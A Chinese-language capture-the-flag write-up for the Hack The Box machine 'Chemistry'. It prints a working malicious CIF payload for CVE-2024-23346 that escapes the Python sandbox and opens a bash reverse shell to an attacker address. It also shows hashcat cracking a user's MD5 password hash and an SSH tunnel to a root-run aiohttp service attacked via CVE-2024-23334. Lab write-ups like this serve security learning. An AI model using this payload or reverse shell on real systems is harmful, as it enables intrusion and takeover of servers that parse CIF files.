---
layout: post
title: HTB——Chemistry
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Chemistry/01.png?raw=true)

# 0x01 信息收集

---

此处`fscan`扫不出来特定端口的，我们就只贴`Tscan`的结果了。

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.4  Expired: 2026.01.01
[00:25:16] [INFO] Start IpScan:10.129.231.170
[00:25:16] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[00:25:17] [+] 10.129.231.170:22 open
[00:25:18] [+] [TCP/SSH]  [OpenSSH 8.2p1 Ubuntu 4ubuntu0.11] 10.129.231.170:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11]
[00:25:18] [INFO] start SSH check 10.129.231.170:22
[00:25:18] [+] 开始 SshScan 任务: SSH://10.129.231.170:22
[00:25:19] [+] 10.129.231.170:5000 open
[00:25:29] [+] [TCP/HTTP] [200] [Werkzeug/3.0.3 Python/3.9.5] http://10.129.231.170:5000 [Chemistry - Home]
                                                          
[00:25:49] [+] alive ports is: 2
[00:25:49] [+] Ip扫描结束:10.129.231.170
[00:25:49] [INFO] Start UrlScan:http://10.129.231.170:5000
[00:25:49] [+] [TCP/HTTP] [200] [Werkzeug/3.0.3 Python/3.9.5] http://10.129.231.170:5000 [Chemistry - Home]
                                                 
[00:25:49] [+] Url扫描结束:http://10.129.231.170:5000
[00:25:49] [+] 项目任务完成:Default, Timeuse：32.707682943
[00:25:49] [+] 扫描结束,耗时: 33.253561684s
```

---

# 0x02 CVE-2024-23346

---

注册登陆后发现是一个文件上传系统，把示例的`CIF`文件下载下来，发现看不懂。搜到一个关于CIF文件解析漏洞的`CVE-2024-23346`，照着打就可以执行RCE。

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.xx.xx/xxxx 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

上传后即可接收到`shell`，但我们仍找不到flag，还需要进一步行动。在`instance`文件夹内，我们翻到了一个数据库文件`database.db`，下载下来使用`navicat`打开.使用`hashcat`爆破`rosa`的密码

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Chemistry/02.png?raw=true)

```powershell
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Fri Apr 04 13:01:09 2025 (0 secs)
Time.Estimated...: Fri Apr 04 13:01:09 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   141.0 MH/s (2.02ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Speed.#2.........: 14132.0 kH/s (10.77ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Speed.#*.........:   155.2 MH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4456448/14344385 (31.07%)
Rejected.........: 0/4456448 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> seaford3344
Candidates.#2....: seaford123 -> qu956421
Hardware.Mon.#1..: Temp: 49c Util: 30% Core: 232MHz Mem:9001MHz Bus:8
Hardware.Mon.#2..: N/A
```

使用SSH登上去就能拿到`user.txt`了

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Chemistry/03.png?raw=true)

---

# 0x03 CVE-2024-23334

---

检查靶机状态，我们发现其内部开放了一个8080端口。那我们尝试重新登陆，并将此流量带到本地端口访问查看。

```
┌──(root㉿kali)-[/home/kali/HTB/Chemistry]
└─# ssh -L 9090:localhost:8080 rosa@10.129.231.170
```

发现此8080端口是一个`Site monitor`，我们先尝试找到其工作目录。权限是`root`的，我们进不去，只能先看看8080的服务能不能打了。提示我们注意此服务的`AioHttp`服务及其版本号。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Chemistry/04.png?raw=true)

那我们再次尝试查找一下与此有关的CVE`CVE-2024-23334`.照着打一下。注意此处网站静态目录是`assets`而非exploit中的`static`，需要略加修改。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Chemistry/05.png?raw=true)

---

# 0x04 总结

一台逆天靶机，除了打CVE就是打CVE。也就是开着`Guide Mode`能打一打了，不给提示的话估计以我的水准只能出到`user`。
